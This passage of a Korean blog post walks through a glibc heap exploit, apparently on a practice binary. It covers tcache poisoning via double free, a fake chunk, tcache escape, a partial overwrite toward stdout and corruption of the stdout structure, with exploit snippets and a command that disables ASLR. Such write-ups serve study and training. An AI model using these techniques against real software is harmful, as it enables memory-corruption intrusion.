471w\"\n        sizes=\"(max-width: 471px) 100vw, 471px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"how-to-free\" style=\"position:relative;\"><a href=\"#how-to-free\" aria-label=\"how to free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to Free?</h2>\n<ul>\n<li>첫 번째 할당 때 FD의 한 바이트를  “\\x70”으로 덮어 써 Fake Chunk의 데이터 부분을 가리키도록 한다. (FD: 0x555555757270)</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY04XN0W6EIBCFYZ+jKpAFmRFFBUZFZS80oU3f/4WabrxtN/nvJt+ZIp5jevbpe53zHFLoXedXQ5uh3WDfMolc/VlRfsV6tFXyZSZBlwArGhANiuY/duMqr9z2LFGdF+5PoS1X8JbduM6RDV2VQvlJ3J9MDeyB7HV7+7z4mAYBg7Rk/CGnrMOBPoyErdU+6gdCLbFWd7+jEl5pLqGIhMs0XDFdYduvvZ0XnJNySRlHYFbsHHRWGwtm1C30jlMS4eBuk2b8AWAVOjAt2/WtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png\"\n        srcset=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/e9ff0/6.png 180w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/f21e7/6.png 360w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png 720w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/914ae/6.png 860w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD를 Fake Chunk의 주소 값으로 조작하여 첫 번째 tcache가 Fake chunk의 주소 값을 가리키는 것을 확인할 수 있다.</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoklEQVQoz33SW3LbNhQG4CyksWTrEkmxnciyTV0si5IpixRBiiAAEiBIkOBF98ROm5esoJPOdCmd6RI7GjdtlIcs4Jtz/vOfV49K3+j0hu3+ZGLeDO6BRw3HNSAeTmdnrYvT1nm7f3epdM9vlAul22h3TitvarVmqdooVRuv5iYkv66iPz7T3z+BTcxWS5KnUCZOHLVHw+pVG8kkWK3YquDrNYhYudk6qbz5F0MUZH9+ef7r68e/v5Lf1nFcxOmShWkQyvaVcto859u1fH6ST/vs+Ylui7OLi5Ozbxi4no2o7uCxDibETT59iPbbYLti66IzUavKDY4ET4tAZlG+sjApVeov8oB1C1rQMy00mc4Hqoa4gDQAiBgL97JzW663TAe7HoceQzQ0LKf0becDNh1iuZ5hQU23VM1gQpJAYBYin7/rKOX6W5dyP0z8MKZC2sgr1xr/Y8wiFklEQ9PB07mdb/dyuck2u3yzv+7dlWstnuTpei9Xm3zzwQ/FETYhcQizXF8zrPuHWRCnL0OYkO+vlZNKA9EwiHMmJE9y6NEjPNUtAzhT3RzPzP7owaUcEoYod/3g6rZfa13OLAdAAiC2sa8Z4CgzuFPtO3WqanOHqDMDceF4AaSh7bHRVO8Nx331YTDSusNxdzjuKINy9bvJiAs/SrksHELBo7XLtokfhZhzyHo3/dfVhsiWcrllkfR5ssD0rN46qfxX1cIF0FtgOjXtSFs8hcWGiCWKdkjoyuiXatMhzOMxYaHHYwDxUWbdcgE8tPVgAHX8yHlMWRQEImDi6rpbqjWB67n+4QSYhfOFe4RtRB18eIC57Y4e5zwtfCFZkrEke3/bK9dbhAue5EGchmnx47UxEzSUQZxZrqcZ1kvP6XqXrXfXvcHPe/4H6gX+guCc2pUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6_1.png\"\n        title=\"./6_1.png\"\n        src=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png\"\n        srcset=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/e9ff0/6_1.png 180w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/f21e7/6_1.png 360w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png 582w\"\n        sizes=\"(max-width: 582px) 100vw, 582px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>포인터 배열 6번째 인덱스에 Fake chunk가 할당된 모습을 확인할 수 있다.</li>\n<li>해제를 세 번 한 이유는 <code class=\"language-text\">tcache->counts</code> 가 underflow 되는 것을 막기 위해서이다.</li>\n<li>free시 tcache→counts++</li>\n<li>malloc시 tcache→counts—</li>\n<li>만약 할당 과정에서 두 개의 tcache를 사용하게 된다면 다음 할당 과정에서 음수 처리가 되지 않기 때문에  255 변환되어 underflow되어 tcache를 사용하지 않는다.</li>\n<li>tcache는 7개 bin만을 관리하기 때문이다.</li>\n</ul>\n<h2 id=\"free-fake-chunk\" style=\"position:relative;\"><a href=\"#free-fake-chunk\" aria-label=\"free fake chunk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Free Fake chunk</h2>\n<ul>\n<li><code class=\"language-text\">0xd0</code> 크기 또한 tcache에서 관리하기 때문에 unsorted bin이 되지 못한다.</li>\n<li>해당 청크를 8번 해제하면 마지막 해제할 때 unsorted bin이 되어 tcache escape가 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">escape</span> <span class=\"token expression\">tcache</span></span>\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">unsorted</span> <span class=\"token expression\">bin <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> escape <span class=\"token function\">tcache</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrUlEQVQoz4XS626iQByGca9jKw7KaYBBQQsUKqUKWlxOIjCACB7aZu//DjamaZu1WU2er7+8yX+moy1kwxo+RA/yXFf0sSjDiS5MdB7JsEdDcLXOnasTCP1y1e6TSQqPgGbBLfONCUfvIdR1NcI2ScH8wj3q3A3cfdZ6IrqbqcTUJIUpYAXA8oCBAwj7HCRoCCjuuwtMQo5lJU0wVNGmtLmg2cbT+P6eMkyaF5gBBUlOBFACEAEOkRfYd3V3NvUDN8O/X3CysBwLjRzDWFqWrZkTKNJDFagWOXnsK/qA4f/BUYzjtJotg03VZuXuJVzTSAnSIq3bKC8ZcUT0GTD46PKWnTAt4qx8Xnh41xbNfhUmUFLivKwPr3jbQCQTFAcY/hzN/8AbHG0K2/Vw3ZbNYRUlHFKirDjjXcshmRj89/E6YYqjtJgtVrhud8f3BFefy29lc4CScg0HSR5usO16+bap2qO/TjlJidJiuz/huoXS1eUoK+O8mi39sj3uTu9xiuFwnBTb9u3Pdn+6sbxarIJgbdjOMoiDJHM8nxFGc8/316kXrllx2PvxN77wX2mEmoOMdcSpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/4888cd178a7732d198d147e63ff153e5/37523/7.png\"\n        srcset=\"/static/4888cd178a7732d198d147e63ff153e5/e9ff0/7.png 180w,\n/static/4888cd178a7732d198d147e63ff153e5/f21e7/7.png 360w,\n/static/4888cd178a7732d198d147e63ff153e5/37523/7.png 720w,\n/static/4888cd178a7732d198d147e63ff153e5/59822/7.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">0x555555757260</code> Fake Chunk 부분을 8번 해제하여 마지막 한 부분이 unsortedbin 값에 대입된다.</li>\n<li>unsorted bin으로 넘어가는 부분에서 FD, BK 위치에 main_arena 주소가 담겨 있는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"point-to-stdout\" style=\"position:relative;\"><a href=\"#point-to-stdout\" aria-label=\"point to stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>point to stdout</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqUlEQVQoz03Qa2+iQBQG4P6KTRovRQvVbuyuxoLOKDDAAMNFLgPDcJFAY9Pb/v/vjWl33a/nnCfvm3NlQc1HFkHYPaQ6JgfKWNVSXlNey3A/nEhLBei2Zzgecjxkk/liOb6d3YjzG3F+ZXiHiFUBLdwwBZoZZzykhRNEThDvEB4Iomq5RdMnrIxZFdFipcDhRBKk+zO2gyTjdZgwP6Y6JvzY8bbLqqbuTiSMr8dT5Ph1/5xXx7xuq7ZXdtoFkyjjTUd5E2Wlcb47nd7+HJ+em/7kBtH1eGqSsH/9eHp571/eT28fClQH/7DphhEtwpTZ/rlnwkp+7M4l8xJhdyBIe8NmdcfqNq/bsu1ksL8kI9sPk5wECSYHoJlhmlPexDmnvEHY/TEUoI7ToklZFbMqKxsFqheMZWA/bl2o6djzokw1nUegAs2AyIKatVLgUgZb1ZSBulWNzV4X7x8u3zZlYK43IcKbnQ51vDdsDRPTDUwSBEmO/QjqlobJ7/VmtljNFssv9o23DyuwWGrrjfTz10AQR9O70fRuOJGGE2kgiH8n0uh29rX6H38CClWFRviwlkEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png\"\n        srcset=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/e9ff0/8.png 180w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/f21e7/8.png 360w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png 572w\"\n        sizes=\"(max-width: 572px) 100vw, 572px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>stdout 주소와 main_arena 영역의 주소는 가까우며 1.5byte brute-force를 통해 main_arena의 주소를 stdout 주소로 조작해야 한다.</li>\n<li>ASLR을 끈 후에 익스프로잇을 작성하자</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">sysctl <span class=\"token operator\">-</span>w kernel<span class=\"token punctuation\">.</span>randomize_va_space<span class=\"token operator\">=</span><span class=\"token number\">0</span></code></pre></div>\n<ul>\n<li>미리 할당한 청크를 Double Free해 unsorted bin 청크 위에 새로 할당하고 하위 바이트를 덮어써 stdout 주소로 조작 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">point</span> <span class=\"token expression\">to main_arena address of unsorted bin</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">stdout</span> <span class=\"token expression\">brute force</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\\x07\\xdd\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVUlEQVQoz43Q226CQBCAYV7DpCzKssssuOBC8ICCBypYj4itpbZarU37/m/QYONFE9ua/Jm7L5kZSQQ1J3B57DPHAc7MGmMWKxNQtP+TSqFXcq3S0JdNX1ZBroCsXiULLHc95Nk3SRPxNiIG0kAhRUj7kXyaCtbPUQWDhI0qBcHNDlSbthCOYLalV6uAMWgaUA3wKaqBShhiVhm4onPEamVqSEnIOm17ktSDpGF6EbiJ7bTiYRJFsWC8QQ1xyiSgEqMwUHhkiAJnWTZLl4uH1eZwCOOJ3QiW+cs0W+tcKBpgwlTCMGHKxbVnq3w0y+JJmr/s+/HIbbY3r8fscUNNW1apcr758sPS9dN4nk3S+93x4/Zu6raC7dtHvt0DF9/4tyrUkNL7fLxYjebL3fvncDwTdf95/75+3rFr8KDTC7tRuz/0e5Hnh5bbCAZxKxxgMBHW/8Zf6f5tmHFRerAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/77760310dd7914b3f7438543febc9f5a/37523/9.png\"\n        srcset=\"/static/77760310dd7914b3f7438543febc9f5a/e9ff0/9.png 180w,\n/static/77760310dd7914b3f7438543febc9f5a/f21e7/9.png 360w,\n/static/77760310dd7914b3f7438543febc9f5a/37523/9.png 720w,\n/static/77760310dd7914b3f7438543febc9f5a/302a4/9.png 1080w,\n/static/77760310dd7914b3f7438543febc9f5a/dc61a/9.png 1147w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Double Free Bug를 바탕으로 같은 주소를 가리키게 한 다음 해당 크기 만큼 동적할 당하여 FD 값을 <code class=\"language-text\">\\x70</code> 바이트로 변조하여 Fake Chunk를 가리키게 한다.</li>\n<li>다음 할당은 버리고 Fake Chunk에 값을 써 하위 3바이트 부분을 stdout 주소로 변조한다.</li>\n<li>그럼이제 stdout을 조작할 준비가 끝났다.</li>\n</ul>\n<h2 id=\"overwrite-stdout-struct\" style=\"position:relative;\"><a href=\"#overwrite-stdout-struct\" aria-label=\"overwrite stdout struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overwrite Stdout Struct</h2>\n<ul>\n<li>Double Free Bug를 통해 조작한 stdout 주소가 존재하는 위치에 힙 청크를 할당 한다.</li>\n<li>할당하게 되면 FD가 stdout 주소가 되기 때문에 다음 할당 시 stdout 구조체에 할당이 되어 해당 구조체에 값을 쓸 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABDElEQVQY032Ny27CMBRE8xstwU78im/8CLEJdiCBJulTYkclyqb//xkVbUHqokhHs5ozk3SD7fuq22+WY3Druqykj6UL4AIQIRGVmP1LMnsJyKjZ4NMhkGqX8SIX8ocb2q+cPgakdTqu5kOL9RazArPz4e3Pi/wU51rdTcvZFJHepUSmBBADzGTG/1TRJdFVvjeWCMuqFdgttVNZN8ZbWxG9ENqLlBZzWiAmMybJeQ7ybzIGmEOydmC17uu49bFpbKh942Nlg5OmlyaAiVK1ogwCgElJhSLcEq4Iz8Emp6N5GM3+YA5HFd8b3L7R7pN2H265OeyG0/T8GjarQjWFMhyo8ahusWvxIhBRfgF/OEaudvk0pQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f210e0c184e41d303510650668f2cd66/37523/10.png\"\n        srcset=\"/static/f210e0c184e41d303510650668f2cd66/e9ff0/10.png 180w,\n/static/f210e0c184e41d303510650668f2cd66/f21e7/10.png 360w,\n/static/f210e0c184e41d303510650668f2cd66/37523/10.png 720w,\n/static/f210e0c184e41d303510650668f2cd66/35751/10.png 873w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>이제 stdout 구조체를 영역을 할당하여 값을 조작하도록 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 513px; \"\n    >\n      <span\n    